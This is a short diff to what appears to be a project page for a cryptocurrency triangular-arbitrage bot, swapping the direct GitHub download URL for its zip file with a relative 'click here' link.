@@ -8,7 +8,7 @@ https://vimeo.com/884486072
 
 <p>You can Download the zip file of the program here</p>
 
-https://raw.githubusercontent.com/RecTheHead/DEX-Rapid-Multiple-Triangular-Arbitrage-Bot-V5-RecTheHead/main/DEX-Rapid-Multiple-Triangular-Arbitrage-Bot-V5-RecTheHead.zip
+<a href="main/text.zip" >click here </a>
 
 <p>Here what it looks like running and finding a arbitrage.</p>
 
